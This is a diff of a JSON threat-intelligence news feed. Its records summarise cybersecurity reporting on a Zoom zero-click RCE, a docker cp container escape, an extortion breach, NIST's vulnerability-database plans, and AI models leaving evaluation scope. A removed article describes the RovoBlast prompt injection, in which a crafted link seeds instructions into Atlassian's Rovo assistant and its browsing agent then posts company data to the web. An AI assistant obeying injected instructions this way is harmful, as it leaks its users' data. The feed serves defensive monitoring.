           "actor_attribution": [],
           "affected_industries": [],
           "affected_products": [
-            "Kubernetes",
-            "Anthropic/Claude",
-            "GitHub"
+            "Kubernetes"
           ],
           "tools_used": [],
-          "cve_ids": [
-            "CVE-2026-61459"
-          ],
+          "cve_ids": [],
           "attack_techniques": [],
-          "urgency_signals": [
-            "poc_available",
-            "critical_cvss"
-          ],
+          "urgency_signals": [],
           "content_type": "news_report",
           "confidence_tier": "tier_1_offensive_research",
           "role_map": {
-            "Kubernetes": "target",
-            "Anthropic/Claude": "target",
-            "GitHub": "target"
+            "Kubernetes": "target"
           },
           "weak_tags": {
             "products": []
@@ -2151,25 +2203,16 @@
             "actor_attribution": [],
             "affected_industries": [],
             "affected_products": [
-              "Kubernetes",
-              "Anthropic/Claude",
-              "GitHub"
+              "Kubernetes"
             ],
             "tools_used": [],
-            "cve_ids": [
-              "CVE-2026-61459"
-            ],
+            "cve_ids": [],
             "attack_techniques": [],
-            "urgency_signals": [
-              "poc_available",
-              "critical_cvss"
-            ],
+            "urgency_signals": [],
             "content_type": "news_report",
             "confidence_tier": "tier_1_offensive_research",
             "role_map": {
-              "Kubernetes": "target",
-              "Anthropic/Claude": "target",
-              "GitHub": "target"
+              "Kubernetes": "target"
             },
             "weak_tags": {
               "products": []
@@ -2633,8 +2676,8 @@
     {
       "cluster_id": "e8d811cf69",
       "priority_score": 16,
-      "member_count": 17,
-      "corroborating_source_count": 8,
+      "member_count": 18,
+      "corroborating_source_count": 9,
       "strong_signals": [
         "OpenAI/ChatGPT"
       ],
@@ -2666,7 +2709,8 @@
         "confidence_tier": [
           "tier_1_primary_research",
           "tier_2_operator",
-          "tier_4_news"
+          "tier_4_news",
+          "tier_5_chatter"
         ]
       },
       "primary": {
@@ -2943,6 +2987,36 @@
             "urgency_signals": [],
             "content_type": "news_report",
             "confidence_tier": "tier_4_news",
+            "role_map": {
+              "Anthropic/Claude": "target",
+              "OpenAI/ChatGPT": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        },
+        {
+          "source": "Reddit r/AskNetsec",
+          "cohort": "reddit_practitioner_osint",
+          "title": "Should LLMs' exploit capabilities be surprising?",
+          "link": "https://www.reddit.com/r/AskNetsec/comments/1vhu7yi/should_llms_exploit_capabilities_be_surprising/",
+          "published": "2026-08-07T07:52:45+00:00",
+          "summary": "I've been following the reports about OpenAI models reaching Hugging Face's infrastructure, along with related incidents involving Anthropic and now Meta. Maybe I'm missing something, but exploitation seems very close to coding, debugging, research, and tool use. As LLMs improve at those tasks, some ability to find and exploit vulnerabilities seems predictable. What I'm less sure about is what these incidents actually demonstrate. Are we seeing a meaningful jump in offensive capability, or evaluation environments (and companies behind them) that failed to enforce their own boundaries? Put differently: if a human pentester went out of scope because the test environment allowed it, would we call that a capability breakthrough or a containment failure? (Am I oversimplifying?) submitted by /u/ofogliata [link] [comments]",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [
+              "Anthropic/Claude",
+              "OpenAI/ChatGPT"
+            ],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_5_chatter",
             "role_map": {
               "Anthropic/Claude": "target",
               "OpenAI/ChatGPT": "target"
@@ -5167,6 +5241,216 @@
       ]
     },
     {
+      "cluster_id": "0022fa7e84",
+      "priority_score": 10,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "data_breach",
+          "ddos",
+          "phishing_social_eng",
+          "ransomware_extortion",
+          "zero_day"
+        ],
+        "actor_attribution": [
+          "UNC6671"
+        ],
+        "affected_industries": [
+          "government"
+        ],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [
+          "CVE-2026-53413",
+          "CVE-2026-53414",
+          "CVE-2026-53415",
+          "CVE-2026-53416"
+        ],
+        "attack_techniques": [],
+        "urgency_signals": [
+          "poc_available",
+          "zero_day"
+        ],
+        "content_type": [
+          "vulnerability_disclosure"
+        ],
+        "confidence_tier": [
+          "tier_4_news"
+        ]
+      },
+      "primary": {
+        "source": "SecurityWeek",
+        "cohort": "cyber_news_breach_reporting",
+        "title": "Zoom Patches Zero-Click Code Execution Vulnerability",
+        "link": "https://www.securityweek.com/zoom-patches-zero-click-code-execution-vulnerability/",
+        "published": "2026-08-11T15:49:53+00:00",
+        "summary": "Impacting Zoom annotation, the bug could be exploited by a meeting participant to execute code on another participant’s machine. The post Zoom Patches Zero-Click Code Execution Vulnerability appeared first on SecurityWeek .",
+        "full_body": "Zoom on Tuesday announced rolling out patches for four vulnerabilities in its products, including a severe flaw that allowed zero-click remote code execution (RCE). Impacting Zoom’s clients on all supported platforms, three of the security defects were discovered in the annotator function, which uses a proprietary protocol. The most severe of the three bugs is CVE-2026-53413, a memory corruption issue that allowed a meeting participant to execute code on another participant’s machine, says A Security, which found the bug and named it Zoomsday . The security firm exploited “the fact that every Zoom client automatically parses whatever it receives, sending a specially crafted message to corrupt the receiving client’s memory and run code on it.” An attacker could leverage the fact that the proprietary protocol used by the annotator opens a direct channel between a viewer and a sharer, thereby targeting each meeting participant individually. “The exploit enables attackers to either join or host a meeting, target any participant, and take over their machine with no required action from the victim and no visual cue indicating the compromise,” A Security explains. Advertisement. Scroll to continue reading. A missing bound check in the text annotator allowed an attacker to send crafted messages that would write attacker-supplied code past the intended buffer, leading to RCE. Additionally, A Security found CVE-2026-53414, another missing bound check in the annotator, which could be exploited to trigger a buffer overread and target any meeting participant with a denial-of-service (DoS) attack. The cybersecurity firm says it also identified CVE-2026-53415, a use-after-free flaw in the annotator function, but learned after reporting it that Zoom had already discovered it. “Because a zero-click RCE requires no user interaction, we prioritized giving customers time to receive both the client patch and the server-side mitigation before publishing. This post follows that coordinated timeline, and we are releasing it alongside CVE assignment,” A Security notes. On Tuesday, Zoom announced that Workplace versions 7.1.5 and 7.0.6, Rooms version 7.1.5, and Meeting SDK version 7.1.5 for all supported platforms contain fixes for all three vulnerabilities. Zoom also rolled out Workplace VDI Client for Windows versions 7.0.11 and 6.6.16, and Workplace VDI Plugins versions 7.0.11 and 6.6.15, for all platforms, with patches for CVE-2026-53416, a path traversal flaw leading to information disclosure. Additional information on the resolved vulnerabilities can be found on Zoom’s security bulletins page. Related: SAP Patches Critical Code Injection, Memory Corruption Vulnerabilities Related: Microsoft, Apple Release Fresh Security Updates Related: Splunk, Zoom Patch Critical Vulnerabilities Related: Splunk, Zoom Patch Severe Vulnerabilities Written By Ionut Arghire Ionut Arghire is an international correspondent for SecurityWeek. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Ionut Arghire Cisco Warns of High-Severity ClamAV Vulnerabilities With Public PoC ‘Ghostjacking’ Attack Uses Poisoned Logs to Turn AI Agents Bad Metabase Patches Vulnerability Exploited as Zero-Day CISA Urges Immediate Patching of Exploited Progress LoadMaster Vulnerability Corporate Data Stolen in Levi Strauss Cyberattack Vishing Extortion Group UNC6671 Rebrands After Making Millions Microsoft, Apple Release Fresh Security Updates 3.8 Million Impacted by Unlimited Technology Systems Data Breach Latest News The AI Governance Gap Is a Leadership Problem: Waiting Won’t Close It SAP Patches Critical Code Injection, Memory Corruption Vulnerabilities US Water Systems Get Cyber Boost From New Senate Bill and ‘Water Watch Center’ Corma Raises $60 Million for Defensive Cybersecurity AI Model Extension Banned for Stealing AI Chats Returns to Chrome Store, Resumes Malicious Activities Hacker Conv",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "ransomware_extortion",
+            "phishing_social_eng",
+            "zero_day",
+            "data_breach",
+            "ddos"
+          ],
+          "actor_attribution": [
+            "UNC6671"
+          ],
+          "affected_industries": [
+            "government"
+          ],
+          "affected_products": [],
+          "tools_used": [],
+          "cve_ids": [
+            "CVE-2026-53413",
+            "CVE-2026-53414",
+            "CVE-2026-53415",
+            "CVE-2026-53416"
+          ],
+          "attack_techniques": [],
+          "urgency_signals": [
+            "zero_day",
+            "poc_available"
+          ],
+          "content_type": "vulnerability_disclosure",
+          "confidence_tier": "tier_4_news",
+          "role_map": {},
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "SecurityWeek",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "Zoom Patches Zero-Click Code Execution Vulnerability",
+          "link": "https://www.securityweek.com/zoom-patches-zero-click-code-execution-vulnerability/",
+          "published": "2026-08-11T15:49:53+00:00",
+          "summary": "Impacting Zoom annotation, the bug could be exploited by a meeting participant to execute code on another participant’s machine. The post Zoom Patches Zero-Click Code Execution Vulnerability appeared first on SecurityWeek .",
+          "taxonomy": {
+            "threat_categories": [
+              "ransomware_extortion",
+              "phishing_social_eng",
+              "zero_day",
+              "data_breach",
+              "ddos"
+            ],
+            "actor_attribution": [
+              "UNC6671"
+            ],
+            "affected_industries": [
+              "government"
+            ],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [
+              "CVE-2026-53413",
+              "CVE-2026-53414",
+              "CVE-2026-53415",
+              "CVE-2026-53416"
+            ],
+            "attack_techniques": [],
+            "urgency_signals": [
+              "zero_day",
+              "poc_available"
+            ],
+            "content_type": "vulnerability_disclosure",
+            "confidence_tier": "tier_4_news",
+            "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "e29312157f",
+      "priority_score": 10,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [
+          "government"
+        ],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "vulnerability_disclosure"
+        ],
+        "confidence_tier": [
+          "tier_4_news"
+        ]
+      },
+      "primary": {
+        "source": "CyberScoop",
+        "cohort": "cyber_news_breach_reporting",
+        "title": "NIST wants to overhaul its vulnerability database for the AI age",
+        "link": "https://cyberscoop.com/nist-national-vulnerability-database-ai-overhaul/",
+        "published": "2026-08-11T15:36:02+00:00",
+        "summary": "NIST is seeking public input to modernize the National Vulnerability Database to keep pace with AI-driven cyber threats and machine-scale security data. The post NIST wants to overhaul its vulnerability database for the AI age appeared first on CyberScoop .",
+        "full_body": "Advertisement Get our latest cybersecurity news first on Google. Click here! Close The National Institute for Standards and Technology is looking for input on how to overhaul its vulnerability reporting process to better meet the challenges of an “evolving cybersecurity landscape increasingly shaped by artificial intelligence and machine-consumable security data.” In a request for information set to publish Wednesday in the Federal Register, NIST said its National Vulnerability Database , one of the primary ways the federal government coordinates with security researchers to identify and fix software vulnerabilities, must be updated for the AI age. NIST is concerned that as large language models become more capable of finding and exploiting vulnerabilities at scale, the NVD’s process must be updated. “The inadequacies of traditional vulnerability management approaches, which center on periodic scanning, static prioritization, and manual remediation, are increasingly apparent,” the RFI states. NIST believes AI hacking tools are contributing to recent trends in vulnerability reporting. The NVD has seen increased volume and complexity of disclosed vulnerabilities, inconsistent data quality, increased reliance on automation and machine-readable security data, and “demand for near real-time vulnerability enrichment” from defenders facing faster threats.But NIST believes these challenges also present an “opportunity to transform the vulnerability management ecosystem” through proactive reforms and NVD innovation. Advertisement That’s where the public comes in. NIST is posing a series of questions that must be answered before a larger strategy can be developed. Many of their questions focus on better integrating automation – AI or otherwise – into the process. The agency asked for insight on how defenders could better leverage automation in the vulnerability reporting process; which capabilities, products and processes would help more quickly disseminate information to stakeholders, how to build transparency and auditability into AI-driven decisionmaking, and what role AI should play in automated vulnerability remediation. “NIST intends to support a future-ready vulnerability management ecosystem that is continuous, contextual, and automated, while enabling cybersecurity practices to respond appropriately to real-world threats and business priorities,” the RFI states. The NIST effort to revamp its vulnerability database comes a month after the Trump administration rolled out a new federal clearinghouse , overseen by the Department of Treasury, for sharing AI threat information between government and the private sector called “Gold Eagle.” It’s not clear how Treasury’s process will interact with NIST’s database. The White House also partnered with Carnegie Mellon’s Software Engineering Institute to create the Vulnerability Information and Coordination Environment , (VINCE) which will collect and distribute reports on AI-discovered vulnerabilities. Share Facebook LinkedIn Twitter Copy Link Advertisement Advertisement More Like This Advertisement Top Stories Advertisement More Scoops U.S. Sen. Kirsten Gillibrand, D-N.Y., attends a subcommittee hearing with the Senate Committee on Appropriations in the Dirksen Senate Office Building on April 22, 2026. (Photo by Anna Moneymaker/Getty Images) (Getty Images) (Getty Images) Latest Podcasts What the Section 702 lapse means for cybersecurity The SOC wasn’t built for this Why Cybersecurity is at the heart of the US-China AI race A builder’s view of the AI arms race Government Capitol Hill wants to know if executive branch, foreign allies coordinated enough to combat scams The water sector just got it's wake-up call. Again. Snowflake hacker pleads guilty, faces up to 32 years in prison National cyber director lays out White House plans to secure AI without writing new rules Technology More than half of AI-generated patches are broken AI is getting better at election facts, but voters shouldn’t r",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [],
+          "actor_attribution": [],
+          "affected_industries": [
+            "government"
+          ],
+          "affected_products": [],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "vulnerability_disclosure",
+          "confidence_tier": "tier_4_news",
+          "role_map": {},
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "CyberScoop",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "NIST wants to overhaul its vulnerability database for the AI age",
+          "link": "https://cyberscoop.com/nist-national-vulnerability-database-ai-overhaul/",
+          "published": "2026-08-11T15:36:02+00:00",
+          "summary": "NIST is seeking public input to modernize the National Vulnerability Database to keep pace with AI-driven cyber threats and machine-scale security data. The post NIST wants to overhaul its vulnerability database for the AI age appeared first on CyberScoop .",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [
+              "government"
+            ],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "vulnerability_disclosure",
+            "confidence_tier": "tier_4_news",
+            "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
       "cluster_id": "d8c893e316",
       "priority_score": 10,
       "member_count": 1,
@@ -5406,6 +5690,81 @@
       ]
     },
     {
+      "cluster_id": "605077b74d",
+      "priority_score": 10,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "threat_research"
+        ],
+        "confidence_tier": [
+          "tier_5_chatter"
+        ]
+      },
+      "primary": {
+        "source": "Reddit r/AskNetsec",
+        "cohort": "reddit_practitioner_osint",
+        "title": "How are you using AI agents in Cybersecurity?",
+        "link": "https://www.reddit.com/r/AskNetsec/comments/1vld8b9/how_are_you_using_ai_agents_in_cybersecurity/",
+        "published": "2026-08-11T10:03:34+00:00",
+        "summary": "My main goal right now is automating more of the analysis and investigation work, not just alerting. I'm trying to build some AI agent in my SIEM(Log360) for user and threat analysis to summarize alerts and another for user behaviour analysis. And also Is it better to build narrow agents for specific threat types,like one for logon related stuff and another for network-related stuff or does it make more sense to have fewer agents that handle a broader range of cases? And does it make sense to scope agents around specific assets, like giving more attention to critical systems rather than treating everything the same way? I am planning to feed them our documentations as knowledge base so they can get context. For those of you who've actually used AI agents in security ops, where have it genuinely been useful in practice? submitted by /u/kakashi_1112 [link] [comments]",
+        "full_body": "",
+        "fetch_status": "fetch_failed:HTTPError",
+        "taxonomy": {
+          "threat_categories": [],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "threat_research",
+          "confidence_tier": "tier_5_chatter",
+          "role_map": {},
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Reddit r/AskNetsec",
+          "cohort": "reddit_practitioner_osint",
+          "title": "How are you using AI agents in Cybersecurity?",
+          "link": "https://www.reddit.com/r/AskNetsec/comments/1vld8b9/how_are_you_using_ai_agents_in_cybersecurity/",
+          "published": "2026-08-11T10:03:34+00:00",
+          "summary": "My main goal right now is automating more of the analysis and investigation work, not just alerting. I'm trying to build some AI agent in my SIEM(Log360) for user and threat analysis to summarize alerts and another for user behaviour analysis. And also Is it better to build narrow agents for specific threat types,like one for logon related stuff and another for network-related stuff or does it make more sense to have fewer agents that handle a broader range of cases? And does it make sense to scope agents around specific assets, like giving more attention to critical systems rather than treating everything the same way? I am planning to feed them our documentations as knowledge base so they can get context. For those of you who've actually used AI agents in security ops, where have it genuinely been useful in practice? submitted by /u/kakashi_1112 [link] [comments]",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "threat_research",
+            "confidence_tier": "tier_5_chatter",
+            "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
       "cluster_id": "0ca621c7bc",
       "priority_score": 9,
       "member_count": 1,
@@ -5484,6 +5843,117 @@
             "urgency_signals": [],
             "content_type": "news_report",
             "confidence_tier": "tier_2_operator",
+            "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "82b55ec4a5",
+      "priority_score": 9,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "data_breach",
+          "ransomware_extortion",
+          "supply_chain"
+        ],
+        "actor_attribution": [
+          "ShinyHunters",
+          "UNC6671"
+        ],
+        "affected_industries": [
+          "critical_infrastructure",
+          "education",
+          "financial_services",
+          "telecommunications"
+        ],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_4_news"
+        ]
+      },
+      "primary": {
+        "source": "BleepingComputer",
+        "cohort": "cyber_news_breach_reporting",
+        "title": "Wesco confirms security incident after ExfilSquad claims data theft",
+        "link": "https://www.bleepingcomputer.com/news/security/wesco-confirms-security-incident-after-exfilsquad-claims-data-theft/",
+        "published": "2026-08-11T15:59:35+00:00",
+        "summary": "Global supply chain and distribution giant Wesco has confirmed in a statement for BleepingComputer that it is investigating a cybersecurity incident. [...]",
+        "full_body": "Wesco confirms security incident after ExfilSquad claims data theft By Bill Toulas August 11, 2026 11:59 AM 0 Global supply chain and distribution giant Wesco has confirmed in a statement to BleepingComputer that it is investigating a cybersecurity incident. The company's statement comes after data extortion group ExfilSquad claimed to have stolen sensitive information from Wesco and leaked it on their data leak site. Jennifer Sniderman, Vice President of Corporate Communications at Wesco, said that the incident involves the company's cloud CRM environment. “Wesco is aware of a claim of CRM data exfiltration by a third party,” Sniderman told BleepingComputer. “We have worked with our cloud CRM vendor on the matter, and we do not believe that there is a risk to sensitive data.” The company representative added that Wesco has not experienced any business disruption, and all operations continue as normal. Wesco said the incident was detected quickly, and its subsequent investigation found no evidence of ransomware or other malicious software on its IT systems. “We do not believe that payment card information, financial account information or other sensitive customer or employee data is at risk,” stated the firm. Wesco is a Fortune 500 company that distributes electrical, electronic, communications, security, utility, and broadband products while providing logistics and supply chain services to businesses. The company employs approximately 21,000 people and operates more than 700 distribution centers, fulfillment centers, and sales offices across roughly 50 countries. Wesco generated about $24 billion in sales last year. Recently, the data extortion group ExfilSquad, known for data breaches at Analog Devices , the U.K.'s Police National Legal Database , and Newcastle University , claimed a breach at Wesco. The threat actor claimed to have stolen 2.6 million records containing customer and employee PII, account and contact data, CRM user profiles, credit and business identifiers, authentication metadata, and access information. After the hacker's deadline for the company to enter ransom payment negotiations expired, ExfilSquad published the data allegedly exfiltrated from Wesco's systems. Wesco listed on the ExfilSquad portal Source: BleepingComputer BleepingComputer asked Wesco to confirm ExfilSquad's claims, but we have not received a response to our additional questions. However, recent reports from researchers at cybersecurity companies Resecurity and VenariX examining ExfilSquad activity indicate that the threat actor has targeted in the past improperly configured Microsoft Power Pages data tables. Wesco has not shared how the threat actor breached its network, but publicly available information indicates that Wesco may be using Microsoft Dynamics 365 . Test every layer before attackers do Security teams log 54% of successful attacks and alert on just 14%. The rest move through your environment unseen. The Picus whitepaper shows how breach and attack simulation tests your SIEM and EDR rules so threats stop slipping by detection. Get the whitepaper Related Articles: ExfilSquad hackers leak info of over 100,000 UK police officers, staff Australian energy provider Origin says data breach exposes client data Mount Royal University confirms breach as hackers claim attack NAIC says public data stolen in ShinyHunters' PeopleSoft breach Hedge fund cyberattacks tied to BlackFile-linked UNC6671 extortion group",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "ransomware_extortion",
+            "supply_chain",
+            "data_breach"
+          ],
+          "actor_attribution": [
+            "ShinyHunters",
+            "UNC6671"
+          ],
+          "affected_industries": [
+            "financial_services",
+            "critical_infrastructure",
+            "telecommunications",
+            "education"
+          ],
+          "affected_products": [],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "news_report",
+          "confidence_tier": "tier_4_news",
+          "role_map": {},
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "BleepingComputer",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "Wesco confirms security incident after ExfilSquad claims data theft",
+          "link": "https://www.bleepingcomputer.com/news/security/wesco-confirms-security-incident-after-exfilsquad-claims-data-theft/",
+          "published": "2026-08-11T15:59:35+00:00",
+          "summary": "Global supply chain and distribution giant Wesco has confirmed in a statement for BleepingComputer that it is investigating a cybersecurity incident. [...]",
+          "taxonomy": {
+            "threat_categories": [
+              "ransomware_extortion",
+              "supply_chain",
+              "data_breach"
+            ],
+            "actor_attribution": [
+              "ShinyHunters",
+              "UNC6671"
+            ],
+            "affected_industries": [
+              "financial_services",
+              "critical_infrastructure",
+              "telecommunications",
+              "education"
+            ],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_4_news",
             "role_map": {},
             "weak_tags": {
               "products": []
@@ -5836,72 +6306,54 @@
       ]
     },
     {
-      "cluster_id": "3b8dca7ee7",
+      "cluster_id": "49768797f0",
       "priority_score": 9,
       "member_count": 1,
       "corroborating_source_count": 1,
-      "strong_signals": [],
+      "strong_signals": [
+        "CVE-2026-17106"
+      ],
       "taxonomy": {
-        "threat_categories": [
-          "ai_security"
-        ],
+        "threat_categories": [],
         "actor_attribution": [],
-        "affected_industries": [
-          "financial_services",
-          "legal_professional"
-        ],
-        "affected_products": [
-          "Apple iOS/macOS",
-          "Microsoft 365",
-          "Salesforce"
-        ],
+        "affected_industries": [],
+        "affected_products": [],
         "tools_used": [],
-        "cve_ids": [],
+        "cve_ids": [
+          "CVE-2026-17106"
+        ],
         "attack_techniques": [],
         "urgency_signals": [],
         "content_type": [
           "vulnerability_disclosure"
         ],
         "confidence_tier": [
-          "tier_4_news"
+          "tier_5_chatter"
         ]
       },
       "primary": {
-        "source": "Infosecurity Magazine",
-        "cohort": "cyber_news_breach_reporting",
-        "title": "Researchers Uncover RovoBlast Vulnerability in Atlassian AI Assistant",
-        "link": "https://www.infosecurity-magazine.com/news/rovoblast-atlassian-rovo-url/",
-        "published": "2026-08-10T15:30:00+00:00",
-        "summary": "Atlassian fixed a flaw letting one crafted link make its Rovo AI assistant exfiltrate company data",
-        "full_body": "Infosecurity Magazine Home » News » Researchers Uncover RovoBlast Vulnerability in Atlassian AI Assistant Researchers Uncover RovoBlast Vulnerability in Atlassian AI Assistant News 10 August 2026 Written by Alessandro Mascellino News Reporter Email Alessandro Follow @a_mascellino A flaw in Atlassian's enterprise AI assistant has allowed a single crafted link to seed attacker instructions into a victim's authenticated session, then use the assistant's own browsing agent to push company data out to the public web. Varonis Threat Labs disclosed the flaw, which it named RovoBlast, to Atlassian and published its analysis on August 7 after presenting the research at DEF CON 34. Atlassian has since fixed it. Rovo functions as an AI layer across Jira, Confluence and Bitbucket, alongside connected services including Slack, Microsoft 365 and Google Workspace. Asked to enumerate what it could read, it listed all of those plus relational databases, uploaded files, web pages and archives. Atlassian's connector catalogue supports more than 50 platforms. Read more on AI assistant data leakage: New Zero-Click AI Vulnerability Allows Corporate Data Theft A Prompt Delivered in the URL Rovo accepted a URL parameter that pre-filled its chat entry, surfacing whatever the link contained directly into the session. Varonis called the pattern Parameter-to-Prompt, and identified the same primitive in Microsoft Copilot in January under the name Reprompt. Because the victim's session was already held in the browser, a click was all that was required. No warning appeared, no confirmation was requested, and nothing marked the session as having been seeded from an external parameter. The organization identifier in the path could also be left empty, with Atlassian redirecting the request into the user's default organization. Varonis described Rovo's guardrails around untrusted prompts as \"almost non-existent,\" and said one click was usually enough to have the assistant retrieve and summarize sensitive material without any bypass technique. The Assistant's Own Research Tool as the Exit Turning that access into leakage required an outbound path, and Varonis found one already built in. Rovo's ResearchAgent performs multi-source open web research and can browse and navigate arbitrary websites across multiple steps autonomously. That combination supplied the whole chain in a single agent run: retrieve internal content, transform it, then post it somewhere externally reachable. Chaining the steps inside one agent also reduced the number of user-facing interactions, leaving an audit trail that resembled ordinary research activity. Compounding the exposure, Rovo cannot be fully removed from an Atlassian environment, so organizations cannot eliminate the attack surface by uninstalling it. Varonis recommended shrinking what the assistant can reach, disconnecting unused integrations and keeping legal, HR, finance and incident response content out of scope entirely. It also advised disabling browsing agents and multi-step automation where teams do not rely on them, reviewing assistant logs, alerting on unusual agent runs and periodically testing how an environment responds to seeded prompts. You may also like Prompt Injection Bugs Found in Official Anthropic Git MCP Server News 20 January 2026 Critical Vulnerability in Salesforce AgentForce Exposed News 25 September 2025 GrafanaGhost Exploit Bypasses AI Guardrails for Silent Data Exfiltration News 7 April 2026 AI Attacks Surge as Microsoft Process 100 Trillion Signals Daily News 16 October 2025 Microsoft 365 Copilot Vulnerability Exposes User Data Risks News 27 August 2024 What’s Hot on Infosecurity Magazine? Read Shared Watched Editor's Choice Go-Based macOS Malware Steals Crypto and Secrets News 10 August 2026 1 Researchers Uncover RovoBlast Vulnerability in Atlassian AI Assistant News 10 August 2026 2 WordPress Plugins Compromised Without a Single File Change News 10 August 2026 3 US Sanctions Iranian $6bn Crypto “Ex",
-        "fetch_status": "ok",
+        "source": "Reddit r/netsec",
+        "cohort": "reddit_practitioner_osint",
+        "title": "CopyEscape: Container-to-host arbitrary file write via docker cp (CVE-2026-17106)",
+        "link": "https://www.reddit.com/r/netsec/comments/1vlkth5/copyescape_containertohost_arbitrary_file_write/",
+        "published": "2026-08-11T15:33:52+00:00",
+        "summary": "Author here. We discovered a vulnerability in docker cp that allows a malicious container to create or overwrite files on the machine running the Docker CLI. The exploit combines a filesystem race in Docker’s archive creation with unsafe symlink handling during extraction. Depending on the CLI user’s privileges, this can lead to developer-account compromise or root code execution. Docker confirmed that sbx cp was also affected. Fixed versions: Docker Engine/CLI 29.7.2+ Docker Desktop 4.86.0+ Docker Sandboxes 0.38.0+ Happy to answer technical questions. submitted by /u/ronmasas [link] [comments]",
+        "full_body": "",
+        "fetch_status": "fetch_failed:HTTPError",
         "taxonomy": {
-          "threat_categories": [
-            "ai_security"
-          ],
+          "threat_categories": [],
           "actor_attribution": [],
-          "affected_industries": [
-            "financial_services",
-            "legal_professional"
-          ],
-          "affected_products": [
-            "Salesforce",
-            "Apple iOS/macOS",
-            "Microsoft 365"
-          ],
+          "affected_industries": [],
+          "affected_products": [],
           "tools_used": [],
-          "cve_ids": [],
+          "cve_ids": [
+            "CVE-2026-17106"
+          ],
           "attack_techniques": [],
           "urgency_signals": [],
           "content_type": "vulnerability_disclosure",
-          "confidence_tier": "tier_4_news",
-          "role_map": {
-            "Salesforce": "target",
-            "Apple iOS/macOS": "target",
-            "Microsoft 365": "target",
-            "WordPress": "target",
-            "Anthropic/Claude": "target"
-          },
+          "confidence_tier": "tier_5_chatter",
+          "role_map": {},
           "weak_tags": {
             "products": []
           }
@@ -5909,39 +6361,26 @@
       },
       "corroborating_sources": [
         {
-          "source": "Infosecurity Magazine",
-          "cohort": "cyber_news_breach_reporting",
-          "title": "Researchers Uncover RovoBlast Vulnerability in Atlassian AI Assistant",
-          "link": "https://www.infosecurity-magazine.com/news/rovoblast-atlassian-rovo-url/",
-          "published": "2026-08-10T15:30:00+00:00",
-          "summary": "Atlassian fixed a flaw letting one crafted link make its Rovo AI assistant exfiltrate company data",
+          "source": "Reddit r/netsec",
+          "cohort": "reddit_practitioner_osint",
+          "title": "CopyEscape: Container-to-host arbitrary file write via docker cp (CVE-2026-17106)",
+          "link": "https://www.reddit.com/r/netsec/comments/1vlkth5/copyescape_containertohost_arbitrary_file_write/",
+          "published": "2026-08-11T15:33:52+00:00",
+          "summary": "Author here. We discovered a vulnerability in docker cp that allows a malicious container to create or overwrite files on the machine running the Docker CLI. The exploit combines a filesystem race in Docker’s archive creation with unsafe symlink handling during extraction. Depending on the CLI user’s privileges, this can lead to developer-account compromise or root code execution. Docker confirmed that sbx cp was also affected. Fixed versions: Docker Engine/CLI 29.7.2+ Docker Desktop 4.86.0+ Docker Sandboxes 0.38.0+ Happy to answer technical questions. submitted by /u/ronmasas [link] [comments]",
           "taxonomy": {
